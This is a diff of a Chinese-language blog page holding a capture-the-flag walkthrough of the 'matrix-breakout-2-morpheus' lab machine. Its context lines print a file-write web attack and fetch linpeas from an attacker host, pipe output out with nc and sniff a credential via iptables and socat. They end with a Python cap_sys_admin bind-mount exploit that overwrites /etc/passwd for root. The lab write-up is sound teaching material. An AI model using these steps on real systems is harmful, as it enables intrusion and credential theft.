@@ -261,15 +261,15 @@
 
           
           
+          
+          
           <li>
-            <a href="/about/">
+            <a href="/archives/">
               
-              关于
+              归档
               
             </a>
           </li>
-          
-          
           
           
           
@@ -294,9 +294,9 @@
           
           
           <li>
-            <a href="/archives/">
+            <a href="/about/">
               
-              归档
+              关于
               
             </a>
           </li>
@@ -515,25 +515,31 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h1 id="matrix-breakout-2-morpheus"><a href="#matrix-breakout-2-morpheus" class="headerlink" title="matrix-breakout-2-morpheus"></a>matrix-breakout-2-morpheus</h1><h2 id="技术点总结"><a href="#技术点总结" class="headerlink" title="技术点总结"></a>技术点总结</h2><ul>
-<li>Web漏洞利用<ul>
+        <h1>matrix-breakout-2-morpheus</h1>
+<h2 id="技术点总结">技术点总结</h2>
+<ul>
+<li>Web漏洞利用
+<ul>
 <li>文件写入漏洞</li>
 <li>命令注入</li>
 <li>目录遍历</li>
 </ul>
 </li>
-<li>权限提升<ul>
+<li>权限提升
+<ul>
 <li>Linux Capabilities利用</li>
 <li>文件挂载提权</li>
 </ul>
 </li>
-<li>网络技术<ul>
+<li>网络技术
+<ul>
 <li>端口转发</li>
 <li>流量劫持</li>
 <li>Docker网络</li>
 </ul>
 </li>
-<li>信息收集<ul>
+<li>信息收集
+<ul>
 <li>端口扫描</li>
 <li>目录爆破</li>
 <li>进程监控</li>
@@ -546,7 +552,6 @@
 <p>靶机ip：192.168.108.132</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kal ddddx ~ ❯ rustscan -a 192.168.108.132 </span><br></pre></td></tr></table></figure>
 <p><img src="%E5%9B%BE%E7%89%87.png" alt="图片.png"></p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -573,7 +578,6 @@
 </tr>
 </tbody>
 </table>
-</div>
 <p>先访问80和81端口，发现80是个普通端口，源码也没放东西，81是个登录端口，弱密码和万能密码无效</p>
 <p><img src="%E5%9B%BE%E7%89%87%201.png" alt="图片.png"></p>
 <p><img src="%E5%9B%BE%E7%89%87%202.png" alt="图片.png"></p>
@@ -595,7 +599,7 @@
 <p><img src="%E5%9B%BE%E7%89%87%205.png" alt="图片.png"></p>
 <p><img src="%E5%9B%BE%E7%89%87%206.png" alt="图片.png"></p>
 <p><img src="%E5%9B%BE%E7%89%87%207.png" alt="图片.png"></p>
-<p>发现graffiti.php是一个带留言板功能的主页，而且具备<strong>潜在的文件写入</strong>或<strong>命令注入入口，</strong>而且联系同名的.txt文件可以判断这个页面大概率可以对.txt文件进行修改</p>
+<p>发现graffiti.php是一个带留言板功能的主页，而且具备<strong>潜在的文件写入</strong>或**命令注入入口，**而且联系同名的.txt文件可以判断这个页面大概率可以对.txt文件进行修改</p>
 <p><img src="%E5%9B%BE%E7%89%87%208.png" alt="图片.png"></p>
 <p>尝试传入123看看是否能写入.txt文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Kal ddddx ~ ❯ curl -X POST http://192.168.108.132/graffiti.php \                                        at 17:47:46</span><br><span class="line">  -d <span class="string">&quot;message=test123&amp;file=graffiti.txt&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">Nebuchadnezzar Graffiti Wall</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">Mouse here - welcome to the Nebby!</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line">Make sure not to tell Morpheus about this graffiti wall.</span><br><span class="line">&lt;br&gt;</span><br><span class="line">It<span class="string">&#x27;s just here to let us blow off some steam.</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">test123</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;</span></span><br><span class="line"><span class="string">Enter message:</span></span><br><span class="line"><span class="string">&lt;p&gt;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;label&gt;Message&lt;/label&gt;&lt;div&gt;&lt;input type=&quot;text&quot; name=&quot;message&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;graffiti.txt&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;div&gt;&lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">Kal ddddx ~ ❯ curl $ip/graffiti.txt                                                                     at 17:47:56</span></span><br><span class="line"><span class="string">Mouse here - welcome to the Nebby!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Make sure not to tell Morpheus about this graffiti wall.</span></span><br><span class="line"><span class="string">It&#x27;</span>s just here to <span class="built_in">let</span> us blow off some steam.</span><br><span class="line">test123</span><br></pre></td></tr></table></figure>
@@ -619,13 +623,14 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@morpheus:/var/www/html$ docker ps -a</span><br><span class="line">Got permission denied <span class="keyword">while</span> trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get <span class="string">&quot;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1&quot;</span>: dial unix /var/run/docker.sock: connect: permission denied</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@morpheus:/var/www/html$ curl http://192.168.108.50:8000/linpeas.sh -o linpeas.sh</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  820k  100  820k    0     0  72.8M      0 --:--:-- --:--:-- --:--:-- 72.8M</span><br><span class="line">(remote) www-data@morpheus:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line">graffiti.php  graffiti.txt  index.html  linpeas.sh  robots.txt  shell.php  trinity.jpeg</span><br><span class="line">(remote) www-data@morpheus:/var/www/html$ <span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">(remote) www-data@morpheus:/var/www/html$ ./linpeas.sh</span><br><span class="line">(remote) www-data@morpheus:/var/www/html$ nc 192.168.108.50 4444 &lt; /tmp/linpeas.lo /tmp/linpeas.log http://192.168.108.50:8000/linpeas.log</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Files with capabilities (limited to 50):</span><br><span class="line">/usr/bin/python3-9 cap_sys_admin=ep</span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br><span class="line">/usr/sbin/xtables-legacy-multi cap_net_admin=ep</span><br><span class="line">/usr/sbin/xtables-nft-multi cap_net_admin=ep</span><br></pre></td></tr></table></figure>
-<p>发现了python被赋予了<code>cap_sys_admin</code> 能力，并且权限是 <strong>effective (e)</strong> 和 <strong>permitted (p)</strong>，所以当我们以普通用户身份运行 <code>/usr/bin/python3-9</code> 时，这个进程也拥有 <code>CAP_SYS_ADMIN</code> 权限，而这个权限在linux中很强大，<strong>几乎等价于 root 权限</strong></p>
+<p>发现了python被赋予了<code>cap_sys_admin</code> 能力，并且权限是 <strong>effective (e)</strong> 和 <strong>permitted §</strong>，所以当我们以普通用户身份运行 <code>/usr/bin/python3-9</code> 时，这个进程也拥有 <code>CAP_SYS_ADMIN</code> 权限，而这个权限在linux中很强大，<strong>几乎等价于 root 权限</strong></p>
 <p><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_admin">https://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_admin</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@morpheus:/var/www/html$ <span class="built_in">ls</span> -al /usr/bin/python3-9</span><br><span class="line">-rwxr-x--- 1 root humans 5479736 Oct 28  2021 /usr/bin/python3-9</span><br></pre></td></tr></table></figure>
 <p>但是我们发现只有<strong>root和humans组</strong>的成员能执行这个python，线索又断了</p>
 <p>回到开头尝试在靶机上查看两个主页的信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@morpheus:/etc/nginx$ <span class="built_in">cat</span> /etc/nginx/sites-enabled/*</span><br><span class="line">....</span><br><span class="line">server &#123;</span><br><span class="line">    listen 81 default_server;</span><br><span class="line">    listen [::]:81 default_server;</span><br><span class="line"></span><br><span class="line">    root /var/nginx/html;</span><br><span class="line"></span><br><span class="line">    auth_basic <span class="string">&quot;Meeting Place&quot;</span>;</span><br><span class="line">    auth_basic_user_file /var/nginx/html/.htpasswd;</span><br><span class="line"></span><br><span class="line">    index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>目录根路径：<code>/var/nginx/html</code><br>用户名密码存储在：<code>/var/nginx/html/.htpasswd</code></p>
+<p>目录根路径：<code>/var/nginx/html</code><br>
+用户名密码存储在：<code>/var/nginx/html/.htpasswd</code></p>
 <p>查看一下发现是apache使用的md5hash，使用john直接破解，无果</p>
 <p>发现index还给了一点提示</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@morpheus:/etc/nginx$ <span class="built_in">cat</span> /var/nginx/html/.htpasswd</span><br><span class="line">cypher:$apr1$e9o8Y7Om<span class="variable">$5zgDW6WOO6Fl8rCC7jpvX0</span></span><br></pre></td></tr></table></figure>
@@ -639,7 +644,6 @@
 <p>查看程序发现并不在本机上，应该在docker中,程序定期连接到81端口，我们可以想办法截获一下</p>
 <p>用iptables重定向81端口的TCP流量到3333端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@morpheus:/tmp$ iptables -t nat -A PREROUTING -p tcp --dport 81 -j REDIRECT --to-port 3333</span><br></pre></td></tr></table></figure>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -647,14 +651,8 @@
 <th>管理防火墙规则的命令</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
+<tbody></tbody>
 </table>
-</div>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -662,14 +660,8 @@
 <th>指定操作的表是 <code>nat</code> 表（用于网络地址转换）</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
+<tbody></tbody>
 </table>
-</div>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -677,14 +669,8 @@
 <th>删除（delete）一条规则</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
+<tbody></tbody>
 </table>
-</div>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -692,14 +678,8 @@
 <th>链名：数据包刚到达网卡，还未被路由前触发</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
+<tbody></tbody>
 </table>
-</div>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -707,14 +687,8 @@
 <th>匹配协议类型为 TCP 的数据包</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
+<tbody></tbody>
 </table>
-</div>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -722,14 +696,8 @@
 <th>匹配目标端口为 81 的数据包</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
+<tbody></tbody>
 </table>
-</div>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -737,14 +705,8 @@
 <th>动作为重定向（REDIRECT），即转发到本地端口</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
+<tbody></tbody>
 </table>
-</div>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -752,13 +714,8 @@
 <th>重定向目标端口为 3333</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
+<tbody></tbody>
 </table>
-</div>
 <p>启动socat监听并转发</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@morpheus:/tmp$  socat -v TCP-LISTEN:3333,fork TCP:127.0.0.1:81</span><br><span class="line">&gt; 2025/05/25 06:37:49.498612  length=189 from=0 to=188</span><br><span class="line">GET / HTTP/1.1\r</span><br><span class="line">Host: 172.17.0.1:81\r</span><br><span class="line">User-Agent: Go-http-client/1.1\r</span><br><span class="line">Authorization: Basic Y3lwaGVyOmNhY2hlLXByb3N5LXByb2NlZWRzLWNsdWUtZXhwaWF0ZS1hbW1vLXB1Z2lsaXN0\r</span><br><span class="line">Accept-Encoding: gzip\r</span><br><span class="line">\r</span><br><span class="line">&lt; 2025/05/25 06:37:49.500338  length=603 from=0 to=602</span><br><span class="line">HTTP/1.1 200 OK\r</span><br><span class="line">Server: nginx/1.18.0\r</span><br><span class="line">Date: Sun, 25 May 2025 06:37:49 GMT\r</span><br><span class="line">Content-Type: text/html\r</span><br><span class="line">Last-Modified: Thu, 28 Oct 2021 06:22:03 GMT\r</span><br><span class="line">Transfer-Encoding: chunked\r</span><br><span class="line">Connection: keep-alive\r</span><br><span class="line">ETag: W/<span class="string">&quot;617a418b-20a&quot;</span>\r</span><br><span class="line">Content-Encoding: gzip\r</span><br><span class="line">\r</span><br><span class="line">156\r</span><br><span class="line">..\b.......MR.j.0\f=._!r..K..f..^</span><br><span class="line">+\fv...8j......f_?9YG.\b#........7.C.5u...9 &amp;.....XWK...H...Y....s..EN....4;b.\b)....<span class="string">&quot;.E........Z.s......%..:..F..m.P....X.Yk\r....-x..L.F..ARF.0</span></span><br><span class="line"><span class="string">.Z6..&#x27;....F.........i.A.&#125;)...\r[|j=..g......b.&#x27;..........c.......j....q.....a.!.y...`R.+.RB.s.z.F.....9..#.i...&#x27;K:Z     ....L.0.......]2u.....|..m.,..V.....jyK&#125;...V..6|.</span></span><br><span class="line"><span class="string">...\r</span></span><br><span class="line"><span class="string">0\r</span></span><br><span class="line"><span class="string">\r</span></span><br></pre></td></tr></table></figure>
 <p>将拿到的凭证解密</p>
@@ -767,11 +724,12 @@
 <p>拿到凭证后登录到ssh，发现刚好也是humans组的那我们之前收集到的信息就有用了，直接开始使用<code>cap_sys_admin</code>进行提权，伪造一个passwd，将密码为password的密码加密，写入伪造的passwd</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cypher@morpheus:~$ <span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span></span><br><span class="line">cypher</span><br><span class="line">uid=1001(cypher) gid=1001(cypher) <span class="built_in">groups</span>=1001(cypher),1002(humans)</span><br><span class="line">cypher@morpheus:~$ <span class="built_in">cp</span> /etc/passwd ./</span><br><span class="line">cypher@morpheus:~$ openssl passwd -1 -salt abc password</span><br><span class="line">$1$abc<span class="variable">$BXBqpb9BZcZhXLgbee</span>.0s/</span><br><span class="line">cypher@morpheus:~$ vim ./passwd</span><br></pre></td></tr></table></figure>
 <p><img src="%E5%9B%BE%E7%89%87%2011.png" alt="图片.png"></p>
-<p>基于python的exp<br>利用 <code>libc.mount()</code> 和 Python 的 <code>ctypes</code> 库，<strong>通过 <code>MS_BIND</code>（绑定挂载）机制将伪造的 <code>/etc/passwd</code> 文件挂载覆盖到真实的 <code>/etc/passwd</code> 上，从而实现提权</strong></p>
+<p>基于python的exp<br>
+利用 <code>libc.mount()</code> 和 Python 的 <code>ctypes</code> 库，<strong>通过 <code>MS_BIND</code>（绑定挂载）机制将伪造的 <code>/etc/passwd</code> 文件挂载覆盖到真实的 <code>/etc/passwd</code> 上，从而实现提权</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)</span><br><span class="line">MS_BIND = <span class="number">4096</span></span><br><span class="line">source = <span class="string">b&quot;/home/cypher/passwd&quot;</span></span><br><span class="line">target = <span class="string">b&quot;/etc/passwd&quot;</span></span><br><span class="line">filesystemtype = <span class="string">b&quot;none&quot;</span></span><br><span class="line">options = <span class="string">b&quot;rw&quot;</span></span><br><span class="line">mountflags = MS_BIND</span><br><span class="line">libc.mount(source, target, filesystemtype, mountflags, options)</span><br></pre></td></tr></table></figure>
-<h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)</span><br></pre></td></tr></table></figure>
+<h3 id="函数定义">函数定义</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)</span><br></pre></td></tr></table></figure>
 <p>这是为了告诉 <code>ctypes</code> 函数 <code>mount()</code> 的参数类型是什么：</p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -808,7 +766,6 @@
 </tr>
 </tbody>
 </table>
-</div>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">source = <span class="string">b&quot;/path/to/fake/passwd&quot;</span>     <span class="comment"># 自己伪造的 passwd 文件</span></span><br><span class="line">target = <span class="string">b&quot;/etc/passwd&quot;</span>              <span class="comment"># 目标：覆盖系统的 passwd</span></span><br><span class="line">filesystemtype = <span class="string">b&quot;none&quot;</span>             <span class="comment"># bind mount 所需参数</span></span><br><span class="line">options = <span class="string">b&quot;rw&quot;</span>                      <span class="comment"># 可选项，这里没有实质作用</span></span><br><span class="line">mountflags = MS_BIND                 <span class="comment"># 使用绑定挂载</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cypher@morpheus:~$ /usr/bin/python3-9 exp.py</span><br><span class="line">cypher@morpheus:~$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:$1$abc<span class="variable">$BXBqpb9BZcZhXLgbee</span>.0s/:0:0:root:/root:/bin/bash</span><br><span class="line">cypher@morpheus:~$ su root</span><br><span class="line">Password:</span><br><span class="line">root@morpheus:/home/cypher# <span class="built_in">ls</span></span><br><span class="line">FLAG.txt  exp.py  passwd</span><br><span class="line">root@morpheus:/home/cypher# <span class="built_in">cat</span> FLAG.txt</span><br><span class="line">You<span class="string">&#x27;ve clearly gained access as user Cypher.</span></span><br><span class="line"><span class="string">Can you find a way to get to root?</span></span><br><span class="line"><span class="string">root@morpheus:/home/cypher#</span></span><br></pre></td></tr></table></figure>
 <p>结束</p>
